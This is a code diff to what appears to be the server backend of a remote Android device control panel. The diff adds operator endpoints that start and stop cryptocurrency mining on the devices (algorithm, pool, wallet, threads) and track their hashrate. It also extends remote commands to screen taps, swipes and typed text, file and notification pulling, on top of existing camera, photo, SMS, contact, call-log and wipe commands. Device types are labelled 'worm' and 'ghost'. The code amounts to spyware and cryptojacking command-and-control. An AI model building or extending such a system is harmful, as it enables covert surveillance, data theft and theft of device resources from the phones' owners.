@@ -565,11 +565,34 @@ export async function buildApp(opts = {}) {
     }
 
     const gender = typeof req.body?.gender === "string" ? req.body.gender : undefined;
-    const stats = req.body?.stats && typeof req.body.stats === "object" ? req.body.stats : undefined;
+    let stats = req.body?.stats && typeof req.body.stats === "object" ? req.body.stats : undefined;
+    // Screen dims ride the top level for the panel's click overlay — fold into stats.
+    if (req.body?.screen && typeof req.body.screen === "object") {
+      stats = stats ?? {};
+      stats.screen = {
+        w: Number(req.body.screen.w) || 0,
+        h: Number(req.body.screen.h) || 0,
+        density: Number(req.body.screen.density) || 0,
+      };
+    }
     const appType = ["worm", "ghost", "master"].includes(req.body?.appType)
       ? req.body.appType : undefined;
     const apkVersion = typeof req.body?.apkVersion === "string" && req.body.apkVersion.length <= 32
       ? req.body.apkVersion : undefined;
+    const miner = req.body?.miner && typeof req.body.miner === "object" ? req.body.miner : undefined;
+    const MINER_STATES = new Set(["STOPPED", "STARTING", "RUNNING", "STOPPING", "ERROR"]);
+    const minerState = MINER_STATES.has(miner?.state) ? miner.state : undefined;
+    // Hashrate ring: newest first, capped at 120 samples.
+    let lastHashrate;
+    if (minerState || typeof miner?.hashrate === "number") {
+      const ring = Array.isArray(device.lastHashrate) ? device.lastHashrate : [];
+      const sample = {
+        t: new Date().toISOString(),
+        h: typeof miner?.hashrate === "number" ? miner.hashrate : 0,
+        s: minerState ?? device.minerState,
+      };
+      lastHashrate = [sample, ...ring].slice(0, 120);
+    }
     const updated = await prisma.device.update({
       where: { id: device.id },
       data: {
@@ -579,9 +602,28 @@ export async function buildApp(opts = {}) {
         ...(stats !== undefined ? { stats } : {}),
         ...(appType !== undefined ? { appType } : {}),
         ...(apkVersion !== undefined ? { apkVersion } : {}),
+        ...(minerState !== undefined ? { minerState } : {}),
+        ...(lastHashrate !== undefined ? { lastHashrate } : {}),
       },
       select: { id: true, lastSeen: true, status: true },
     });
+    // An auto-stop reported by the agent closes the open session server-side.
+    if (minerState === "STOPPED" || minerState === "ERROR") {
+      const open = await prisma.miningSession.findFirst({
+        where: { deviceId: device.id, stoppedAt: null },
+        orderBy: { startedAt: "desc" },
+      });
+      if (open) {
+        await prisma.miningSession.update({
+          where: { id: open.id },
+          data: {
+            stoppedAt: new Date(),
+            stopReason: typeof miner?.stopReason === "string"
+              ? miner.stopReason : minerState === "ERROR" ? "error" : "stopped",
+          },
+        });
+      }
+    }
     return { id: updated.id, lastSeen: updated.lastSeen, status: updated.status };
   });
 
@@ -595,7 +637,10 @@ export async function buildApp(opts = {}) {
   function stateOf(d) {
     if (d.status === "formatted") return "formatted";
     const age = Date.now() - new Date(d.lastSeen).getTime();
-    return age <= 90_000 ? "online" : age <= 15 * 60_000 ? "idle" : "offline";
+    // A RUNNING miner may starve the poll thread — it cannot decay to
+    // offline/idle before 3+ missed beats beyond the normal window.
+    const onlineWindow = d.minerState === "RUNNING" ? 5 * 60_000 : 90_000;
+    return age <= onlineWindow ? "online" : age <= 15 * 60_000 ? "idle" : "offline";
   }
 
   /** Persist an audit trail entry; never lets logging break the request. */
@@ -710,12 +755,85 @@ export async function buildApp(opts = {}) {
     return reply.code(204).send();
   });
 
+  /* ------------------------------- mining ------------------------------- */
+
+  async function ownedDevice(req, reply) {
+    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
+    if (!device) { reply.code(404).send({ error: "not_found" }); return null; }
+    if (device.ownerId !== req.userId) { reply.code(403).send({ error: "forbidden" }); return null; }
+    return device;
+  }
+
+  async function queueCommand(device, type, payload) {
+    const command = await prisma.command.create({
+      data: {
+        deviceId: device.id, type, payload: payload ?? {},
+        state: "queued", expiresAt: new Date(Date.now() + 24 * 3600 * 1000),
+      },
+    });
+    pushToDevice(device.id, { cmd: { id: command.id, type: command.type, payload: command.payload } });
+    await audit(device.id, "command_queued", { type, commandId: command.id });
+    return command;
+  }
+
+  /** Operator mining controls: start/stop queue device commands + arm state. */
+  app.post("/api/v1/devices/:id/mining/start", { onRequest: [app.authenticate] }, async (req, reply) => {
+    if (req.authKind !== "user") return reply.code(403).send({ error: "forbidden" });
+    const device = await ownedDevice(req, reply);
+    if (!device) return;
+    if (["STARTING", "RUNNING", "STOPPING"].includes(device.minerState)) {
+      return reply.code(409).send({ error: "already_running", state: device.minerState });
+    }
+    const p = req.body && typeof req.body === "object" ? req.body : {};
+    const payload = {
+      algo: String(p.algo ?? "rx/0"),
+      pool: String(p.pool ?? ""),
+      wallet: String(p.wallet ?? ""),
+      threads: Math.max(1, Math.min(8, Number.isInteger(p.threads) ? p.threads : 2)),
+    };
+    const command = await queueCommand(device, "mine_start", payload);
+    await prisma.device.update({ where: { id: device.id }, data: { minerState: "STARTING" } });
+    await audit(device.id, "mining_start", { commandId: command.id, ...payload });
+    return reply.code(201).send({ commandId: command.id, minerState: "STARTING" });
+  });
+
+  app.post("/api/v1/devices/:id/mining/stop", { onRequest: [app.authenticate] }, async (req, reply) => {
+    if (req.authKind !== "user") return reply.code(403).send({ error: "forbidden" });
+    const device = await ownedDevice(req, reply);
+    if (!device) return;
+    if (device.minerState === "STOPPED") {
+      return reply.code(409).send({ error: "not_running", state: "STOPPED" });
+    }
+    const command = await queueCommand(device, "mine_stop", {});
+    await prisma.device.update({ where: { id: device.id }, data: { minerState: "STOPPING" } });
+    await audit(device.id, "mining_stop", { commandId: command.id });
+    return reply.code(201).send({ commandId: command.id, minerState: "STOPPING" });
+  });
+
+  /** Mining detail: current state, hashrate ring, recent sessions. */
+  app.get("/api/v1/devices/:id/mining", { onRequest: [app.authenticate] }, async (req, reply) => {
+    const device = await ownedDevice(req, reply);
+    if (!device) return;
+    const sessions = await prisma.miningSession.findMany({
+      where: { deviceId: device.id },
+      orderBy: { startedAt: "desc" },
+      take: 20,
+    });
+    return {
+      minerState: device.minerState,
+      hashrate: Array.isArray(device.lastHashrate) ? device.lastHashrate : [],
+      sessions,
+    };
+  });
+
   /* ------------------------------ commands ------------------------------ */
 
   // Dashboard-dispatchable command vocabulary; anything else is a 400.
   const COMMAND_TYPES = new Set([
     "ping", "wipe", "camera", "pull_photos", "screen_capture",
-    "sms", "contacts", "call_log", "mine", "apk_update",
+    "sms", "contacts", "call_log", "mine_start", "mine_stop",
+    "input_tap", "input_swipe", "input_text", "files_pull",
+    "notifications_pull", "apk_update",
   ]);
 
   app.post("/api/v1/devices/:id/commands", { onRequest: [app.authenticate] }, async (req, reply) => {
@@ -738,17 +856,7 @@ export async function buildApp(opts = {}) {
         return reply.code(400).send({ error: "bad_payload" });
       }
     }
-    const command = await prisma.command.create({
-      data: {
-        deviceId: device.id,
-        type,
-        payload: safePayload,
-        state: "queued",
-        expiresAt: new Date(Date.now() + 24 * 3600 * 1000),
-      },
-    });
-    pushToDevice(device.id, { cmd: { id: command.id, type: command.type, payload: command.payload } });
-    await audit(device.id, "command_queued", { type, commandId: command.id });
+    const command = await queueCommand(device, type, safePayload);
     return reply.code(201).send({
       id: command.id,
       deviceId: command.deviceId,
@@ -813,6 +921,37 @@ export async function buildApp(opts = {}) {
         where: { id: device.id },
         data: { formattedAt: new Date(), status: "formatted" },
       });
+    }
+    // Mining lifecycle: the agent's result drives MinerState + session rows.
+    if (command.type === "mine_start") {
+      const p = command.payload && typeof command.payload === "object" ? command.payload : {};
+      if (state === "executed") {
+        await prisma.device.update({ where: { id: device.id }, data: { minerState: "RUNNING" } });
+        await prisma.miningSession.create({
+          data: {
+            deviceId: device.id,
+            algo: String(p.algo ?? "rx/0"),
+            pool: String(p.pool ?? ""),
+            wallet: String(p.wallet ?? ""),
+            threads: Number.isInteger(p.threads) ? p.threads : 1,
+          },
+        });
+      } else {
+        await prisma.device.update({ where: { id: device.id }, data: { minerState: "ERROR" } });
+        await audit(device.id, "miner_error", { commandId: command.id, result: updated.result }, "device");
+      }
+    } else if (command.type === "mine_stop" && state === "executed") {
+      await prisma.device.update({ where: { id: device.id }, data: { minerState: "STOPPED" } });
+      const open = await prisma.miningSession.findFirst({
+        where: { deviceId: device.id, stoppedAt: null },
+        orderBy: { startedAt: "desc" },
+      });
+      if (open) {
+        await prisma.miningSession.update({
+          where: { id: open.id },
+          data: { stoppedAt: new Date(), stopReason: "manual" },
+        });
+      }
     }
     await audit(device.id, "command_result", { type: command.type, commandId: command.id, state }, "device");
     return { id: updated.id, state: updated.state, result: updated.result };
